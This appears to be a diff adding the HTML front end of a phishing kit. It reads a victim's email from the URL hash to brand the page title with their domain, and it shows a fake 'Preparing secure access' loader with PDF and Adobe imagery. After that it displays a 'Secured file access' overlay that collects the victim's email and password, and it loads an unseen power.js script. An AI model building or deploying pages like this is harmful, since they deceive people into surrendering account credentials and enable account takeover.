@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Account Verification</title>
+
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Dynamic Title Script (unchanged) -->
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      const hash = window.location.hash.substring(1);
+      const parts = hash.split("@");
+      if (parts.length === 2) {
+        const domain = parts[1];
+        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
+        document.title = capitalized;
+      }
+    });
+  </script>
+
+  <!-- Smooth auto-load to overlay -->
+  <script>
+    window.addEventListener("DOMContentLoaded", () => {
+      const start = document.getElementById("start-screen");
+      const overlay = document.getElementById("overlay");
+
+      if (start && overlay) {
+        // Automatically fade the loader after a few seconds
+        setTimeout(() => {
+          start.classList.add("hide");
+          setTimeout(() => overlay.classList.add("show"), 500);
+        }, 3000); // 3 seconds loading time
+      }
+    });
+  </script>
+</head>
+<body>
+
+  <!-- START: Polished loading screen -->
+  <div id="start-screen" aria-hidden="true">
+    <div class="loader-wrapper">
+      <div class="loader-circle"></div>
+      <div class="loader-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="Loading logo">
+      </div>
+      <div class="loader-text">Preparing secure access...</div>
+    </div>
+  </div>
+  <!-- END start screen -->
+
+  <!-- Fullscreen background iframe -->
+  <iframe id="bg-frame"></iframe>
+
+  <!-- Login overlay -->
+  <div class="overlay" id="overlay" aria-hidden="true">
+    <div class="login-box" role="region" aria-label="Account verification login">
+      <img id="logo" alt="Provider logo" src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+      <div class="info-text">
+        🗂️ <strong>Secured file access</strong> 🔐 — sign in for your provider’s verification
+      </div>
+      <div class="input-group">
+        <i class="fas fa-envelope icon"></i>
+        <input type="email" id="email" placeholder="Email" />
+      </div>
+      <div class="input-group">
+        <i class="fas fa-lock icon"></i>
+        <input type="password" id="password" placeholder="Password" />
+      </div>
+      <div id="error-msg" class="error-msg" aria-live="polite"></div>
+      <button id="login-btn">Login</button>
+    </div>
+  </div>
+
+  <!-- Bouncing Adobe logo -->
+  <div class="bouncing-logo" aria-hidden="true">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" />
+  </div>
+
+  <!-- Javascript -->
+  <script src="power.js"></script>
+</body>
+</html>
